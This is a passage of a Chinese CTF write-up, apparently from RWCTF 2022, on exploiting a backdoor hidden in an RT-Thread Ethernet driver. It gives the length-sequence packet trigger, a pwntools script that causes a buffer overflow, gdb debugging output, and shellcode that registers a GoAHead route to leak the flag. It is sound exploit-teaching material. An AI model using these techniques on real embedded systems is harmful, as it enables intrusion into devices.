rt_kprintf(<span class="string">"EMAC: dropped bad packet. Status: 0x%08x\n"</span>, status);</span><br><span class="line">    v5[<span class="number">0</span>] = dword_60079E78 + <span class="number">0x16D6DD4</span>;         <span class="comment">// backdoor</span></span><br><span class="line">    v5[<span class="number">1</span>] = dword_60079E7C + <span class="number">0xC25FBB</span>;</span><br><span class="line">    v6 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( pktlen == (<span class="keyword">unsigned</span> __int8)(dword_60079E78 - <span class="number">0x2C</span>) )<span class="comment">// 0x62</span></span><br><span class="line">    &#123;</span><br><span class="line">      backdoor_time = time(<span class="number">0</span>);</span><br><span class="line">      backdoor_cnt = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( pktlen == *((<span class="keyword">unsigned</span> __int8 *)v6 + backdoor_cnt) &amp;&amp; time(<span class="number">0</span>) - backdoor_time &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++backdoor_cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( backdoor_cnt == <span class="number">8</span> &amp;&amp; pktlen == <span class="number">0x202</span> &amp;&amp; v12 )</span><br><span class="line">      diy_memcpy((<span class="keyword">int</span>)v4, *(_DWORD *)(v12 + <span class="number">4</span>), pktlen);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而这是该函数的源码（注意函数版本不同，会带来一些差异）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* reception packet. */</span></span><br><span class="line"><span class="function">struct pbuf *<span class="title">smc911x_emac_rx</span><span class="params">(<span class="keyword">rt_device_t</span> dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pbuf</span> *<span class="title">p</span> = <span class="title">RT_NULL</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eth_device_smc911x</span> *<span class="title">emac</span>;</span></span><br><span class="line"></span><br><span class="line">    emac = SMC911X_EMAC_DEVICE(dev);</span><br><span class="line">    RT_ASSERT(emac != RT_NULL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* take the emac buffer to the pbuf */</span></span><br><span class="line">    <span class="keyword">if</span> (LAN9118_RX_FIFO_INF_RXSUSED(smc911x_reg_read(emac, LAN9118_RX_FIFO_INF)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> status;</span><br><span class="line">        <span class="keyword">uint32_t</span> pktlen, tmplen;</span><br><span class="line"></span><br><span class="line">        status = smc911x_reg_read(emac, LAN9118_RXSFIFOP);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* get frame length */</span></span><br><span class="line">        pktlen = (status &amp; LAN9118_RX_STS_PKT_LEN) &gt;&gt; <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        smc911x_reg_write(emac, LAN9118_RX_CFG, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        tmplen = (pktlen + <span class="number">3</span>) / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* allocate pbuf */</span></span><br><span class="line">        p = pbuf_alloc(PBUF_RAW, tmplen * <span class="number">4</span>, PBUF_RAM);</span><br><span class="line">        <span class="keyword">if</span> (p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint32_t</span> *data = (<span class="keyword">uint32_t</span> *)p-&gt;payload;</span><br><span class="line">            <span class="keyword">while</span> (tmplen--)</span><br><span class="line">            &#123;</span><br><span class="line">                *data++ = smc911x_reg_read(emac, LAN9118_RXDFIFOP);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (status &amp; LAN9118_RXS_ES)</span><br><span class="line">        &#123;</span><br><span class="line">            rt_kprintf(DRIVERNAME <span class="string">": dropped bad packet. Status: 0x%08x\n"</span>, status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对照可以得出，backdoor 触发条件如下：</p>
<ul>
<li>发送 <strong>8个</strong> payload 数据包，其<strong>长度</strong>与某个特定数组中的对应 uchar 型数据（即 <code>backdoor</code> 字符串）相等</li>
<li>整个触发 backdoor 的时间必须在 5s 内完成</li>
<li>当 backdoor 计数器为 8 且下一个发送的那个 payload 数据包长度为 0x202</li>
</ul>
<p>这样就可以触发一个<strong>向 0x64 大小的数组覆写 0x202 大小数据</strong>的缓冲区溢出漏洞。</p>
<p>由于该题没有 NX、PIE、ASLR 等保护，因此我们可以通过缓冲区溢出来劫持控制流，执行我们的 shellcode，然后<strong>一定要在 shellcode 执行完成后恢复函数的栈数据等，并跳转回之前的函数</strong>。</p>
<blockquote>
<p>实时操作系统没有内核的概念，因此如果运行时环境被破坏，控制流无法继续执行，则整个操作系统将<strong>立即重启/终止</strong>，无法继续执行。</p>
</blockquote>
<p>这里，我们需要精心设计 shellcode，这里列出两种解法：</p>
<ul>
<li>
<p>手动注册一个 action/backdoor 对应的<strong>事件处理例程</strong>和<strong>路由</strong>，将传入的 flag 直接复制至别的文件数据（例如 <code>/path/to/file1</code>）中，这样当 health checker 将 flag 传给 <code>action/backdoor</code> 时，我们便可以通过访问 <code>/path/to/file1</code> 直接获取到 flag。</p>
</li>
<li>
<p>patch 掉错误界面的显示，使其一直显示 <code>{&quot;status&quot; : &quot;success&quot;}</code> 和返回 HTTP200 状态码。之后 patch 错误界面显示相关的代码，使其引用存在题目内存中的 flag，这样当我们下一次访问错误界面时，即可读取到内存中的 flag 并将其返回给网页前端。</p>
</li>
</ul>
<h2 id="六、漏洞利用">六、漏洞利用</h2>
<h3 id="a-触发-backdoor">a. 触发 backdoor</h3>
<p>这里选择第一种方法（挑战一下），手动注册 action/backdoor 的事件处理例程和路由。</p>
<p>通过动态调试得知：</p>
<ul>
<li><strong>数据包的 metadata 长度为 0x3a</strong>，因此我们在发送数据时需要减去该长度。</li>
<li>发送数据包时，<strong>一定要间隔发送</strong>。否则多个数据包可能会因为网络问题<strong>乱序到达</strong>，无法通过 backdoor check。</li>
<li>程序可能会多次接受其它<strong>不来自于攻击者</strong>的数据包（长度0x3e左右，来源未知），因此在调试时需要过滤掉这种情况。</li>
</ul>
<p>根据上面的分析，我们可以编写出以下的代码来触发漏洞：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(</span><br><span class="line">    os=<span class="string">'linux'</span>,</span><br><span class="line">    arch=<span class="string">'arm'</span>,</span><br><span class="line">    bits=<span class="number">32</span>,</span><br><span class="line">    encoding=<span class="string">'latin'</span>,</span><br><span class="line">    log_level=<span class="string">"debug"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_packet</span><span class="params">(packet_len, data=<span class="string">b''</span>)</span>:</span></span><br><span class="line">    p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">5555</span>)</span><br><span class="line">    remain_len = packet_len - len(data)</span><br><span class="line">    <span class="keyword">assert</span> remain_len &gt;= <span class="number">0</span></span><br><span class="line">    p.send(data + <span class="string">b"_"</span> * remain_len)</span><br><span class="line">    p.close()</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">"backdoor"</span>: <span class="comment"># \x62 \x61 \x63 \x6b \x64 \x6f \x6f \x72</span></span><br><span class="line">        send_packet(ord(ch) - <span class="number">0x3a</span>)</span><br><span class="line">    send_packet(<span class="number">0x202</span> - <span class="number">0x3a</span>)</span><br></pre></td></tr></table></figure>
<p>还记得漏洞触发必须在 4s 内完成，因此编写了该 gdb script 辅助调试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">target remote localhost:1234</span><br><span class="line">b *0x6001b1b4</span><br><span class="line">commands</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$r3</span> &gt; 0x60</span><br><span class="line">        <span class="built_in">printf</span> <span class="string">"packet len = 0x%x\n"</span>, <span class="variable">$r3</span></span><br><span class="line">    end</span><br><span class="line">    <span class="built_in">continue</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b* 0x6001B1BC</span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"backdoor_cnt = 0\n"</span></span><br><span class="line">    <span class="built_in">continue</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b* 0x6001B250</span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"backdoor_cnt = %d\n"</span>, <span class="variable">$r2</span></span><br><span class="line">    <span class="built_in">continue</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b* 0x6001B298</span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"backdoor_memcpy called\n"</span></span><br><span class="line">    tb *0x6001b2a8</span><br><span class="line">    <span class="comment"># continue</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b* 0x600101E4</span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"submit handler called\n"</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"Webs* wp = 0x%x\n"</span>, <span class="variable">$r0</span></span><br><span class="line">    <span class="built_in">continue</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b* 0x60010208</span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"submit handler websGetVar called\n"</span></span><br><span class="line">    <span class="built_in">continue</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment"># b* 0x60d9c5e8     shellcode ret</span></span><br><span class="line"><span class="comment"># b* 0x60d9c5ec     handler address</span></span><br><span class="line"></span><br><span class="line">c</span><br></pre></td></tr></table></figure>
<p>执行效果如下，可以看到成功栈溢出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">packet len = 0x62</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x6001b1bc <span class="keyword">in</span> ?? ()</span><br><span class="line">backdoor_cnt = 1</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">packet len = 0x61</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x6001b238 <span class="keyword">in</span> ?? ()</span><br><span class="line">backdoor_cnt = 2</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">packet len = 0x63</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x6001b238 <span class="keyword">in</span> ?? ()</span><br><span class="line">backdoor_cnt = 3</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">packet len = 0x6b</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x6001b238 <span class="keyword">in</span> ?? ()</span><br><span class="line">backdoor_cnt = 4</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">packet len = 0x64</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x6001b238 <span class="keyword">in</span> ?? ()</span><br><span class="line">backdoor_cnt = 5</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">packet len = 0x6f</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x6001b238 <span class="keyword">in</span> ?? ()</span><br><span class="line">backdoor_cnt = 6</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">packet len = 0x6f</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x6001b238 <span class="keyword">in</span> ?? ()</span><br><span class="line">backdoor_cnt = 7</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">packet len = 0x72</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x6001b238 <span class="keyword">in</span> ?? ()</span><br><span class="line">backdoor_cnt = 8</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">Breakpoint 1, 0x6001b1b4 <span class="keyword">in</span> ?? ()</span><br><span class="line">packet len = 0x202</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x6001b298 <span class="keyword">in</span> ?? ()</span><br><span class="line">backdoor_memcpy called</span><br></pre></td></tr></table></figure>
<p>并将机器打崩：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220129164005728.png" alt="image-20220129164005728"></p>
<blockquote>
<p>打崩后，先按下 <code>ctrl + a</code>，松手再按下 <code>x</code> 以关闭 QEMU 。</p>
</blockquote>
<p>重新调试回到栈溢出的函数调用位置。注意<strong>调用函数时，函数传参分别是 R0、R1、R2</strong>。</p>
<h3 id="b-栈溢出与-shellcode-上传">b. 栈溢出与 shellcode 上传</h3>
<p>之后我们需要将当前栈上的数据 dump 下来，并在栈溢出时完整的覆盖回去，保证栈数据的完整性。因为覆盖长度为 0x202，一定会覆盖到下面的栈帧，因此务必恢复，否则可能会导致 crash。</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220129172718822.png" alt="image-20220129172718822"></p>
<p>需要注意的是，栈溢出能给自己写 shellcode 的空间很有限，只有大约 0x20，因此我们必须用其他方式来上传自己的 shellcode，然后在栈溢出这里只修改返回值来达到跳转执行的目的。</p>
<p>而上传 shellcode 可以用之前 GoAHead 扩展的 submit 方法，动态调试可以得知存放 submit message 的内存地址。</p>
<p>但是，栈溢出跳转时，跳转的 shellcode 地址<strong>不是</strong>这个 v4，因为当栈溢出时，v4 这块内存已经被覆写了：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220129215935617.png" alt="image-20220129215935617"></p>
<p>那该如何获取到 shellcode 的地址呢？我们可以在 shellcode 前增加一些字符串，例如 “ShellcodeHeader”，然后使用 gdb 命令 <strong>find</strong> 全局搜索内存来找到 shellcode 地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find 0x60000000, +0x4000000, <span class="string">'S'</span>,<span class="string">'h'</span>,<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>,<span class="string">'c'</span>,<span class="string">'o'</span>,<span class="string">'d'</span>,<span class="string">'e'</span></span><br><span class="line"><span class="comment"># 不使用 find xxx, +xxx, "Shellcode" 是因为这会匹配末尾的 \0</span></span><br></pre></td></tr></table></figure>
<p>查询结果如下。注意下面的 shellcode 被 URL 转码了（这就是另外的问题了）：</p>
<p><img src="/2022/01/rwctf2022_flag/image-20220130164148119.png" alt="image-20220130164148119"></p>
<blockquote>
<p>或者逆向 <code>websSetSessionVar</code> 函数，找到复制出的字符串地址也是可以的。</p>
</blockquote>
<p>还有一点，将 shellcode 进行 submit 操作之前，<strong>一定要对当前会话进行 login 操作</strong>，否则内存中将无法搜索到 shellcode。</p>
<h3 id="c-shellcode-的作用">c. shellcode 的作用</h3>
<p>shellcode 要做的事情主要有两件：</p>
<ul>
<li>
<p>执行 <code>websDefineAction(&quot;backdoor&quot;, backdoor_handler)</code>注册处理例程。其中 ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">websDefineAction address: 0x6004D28C</span><br></pre></td></tr></table></figure>
<p>“backdoor” 字符串无需持久化，因为该字符串会在执行 <code>websDefineAction</code> 时被<strong>拷贝</strong>进哈希表中。</p>
<p>但 backdoor_handler 需要持久化，因此务必将其拷贝至一个稳定的地方（例如文件系统中，这里我选择将 handler shellcode 复制进 <code>/login_err.html</code> + 0x200 的位置，即 0x606D3aD0）</p>
<p>backdoor handler 需要做的事情有几件：</p>
<ul>
<li>
<p>将 checker 可能传入的 flag 复制至 404 界面。</p>
</li>
<li>
<p>返回一个 <strong>200 {“status”:“success”}</strong> 界面</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">backdoor_handler</span><span class="params">(Webs *wp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* key = <span class="string">"flag"</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* page = <span class="string">"&#123;\"status\" : \"success\"&#125;"</span></span><br><span class="line">    <span class="comment">// 给第三个参数传参 key 是为了避免在找不到值的情况下返回 NULL，便于编写 shellcode</span></span><br><span class="line">    <span class="keyword">char</span>* name = websGetVar(wp, key, key); <span class="comment">// websGetVar：0x600577C4</span></span><br><span class="line">    <span class="comment">// 将 flag 输出</span></span><br><span class="line">    rt_printf(name); </span><br><span class="line">    <span class="comment">// send page</span></span><br><span class="line">    websSetStatus(wp, <span class="number">200</span>);      <span class="comment">// websSetStatus:       0x600588C4</span></span><br><span class="line">    websWriteHeaders(wp, <span class="number">-1</span>, <span class="number">0</span>); <span class="comment">// websWriteHeaders:    0x6005891C</span></span><br><span class="line">    websWriteEndHeaders(wp);     <span class="comment">// websWriteEndHeaders: 0x60058D30</span></span><br><span class="line">    websWrite(wp, page);         <span class="comment">// websWrite:           0x60058E2C</span></span><br><span class="line">    websDone(wp);                <span class="comment">// websDone:            0x6005496C</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里返回 200 OK 数据的写法，主要参考 <a href="https://github.com/embedthis/goahead/blob/master/test/test.c#L327" target="_blank" rel="noopener">goahead/blob/master/test/test.c#L327</a> 的写法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Implement /action/actionTest. Parse the form variables: name, address and echo back.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">actionTest</span><span class="params">(Webs *wp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cchar   *name, *address;</span><br><span class="line"></span><br><span class="line">  name = websGetVar(wp, <span class="string">"name"</span>, <span class="literal">NULL</span>);</span><br><span class="line">  address = websGetVar(wp, <span class="string">"address"</span>, <span class="literal">NULL</span>);</span><br><span class="line">    websSetStatus(wp, <span class="number">200</span>);</span><br><span class="line">    websWriteHeaders(wp, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    websWriteEndHeaders(wp);</span><br><span class="line">  websWrite(wp, <span class="string">"&lt;html&gt;&lt;body&gt;&lt;h2&gt;name: %s, address: %s&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt;\n"</span>, name, address);</span><br><span class="line">    websFlush(wp, <span class="number">0</span>);</span><br><span class="line">  websDone(wp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>执行 <code>websAddRoute(&quot;/action/backdoor&quot;, &quot;action&quot;, 0)</code>重新注册路由表。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">websAddRoute() addr: 0x600636A0</span><br></pre></td></tr></table></figure>
<p>注意第三个参数为 0，由于路由表是以数组形式顺序访问，因此将 pos 设置为 0 可以<strong>将目标路由放至第一个</strong>。</p>
<p>踩过的坑：先前重新注册路由表，是打算先覆写 <code>route.txt</code>，再执行 <code>websLoad(&quot;route.txt&quot;)</code>。但是后来阅读源码，发现这样做太过于麻烦：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 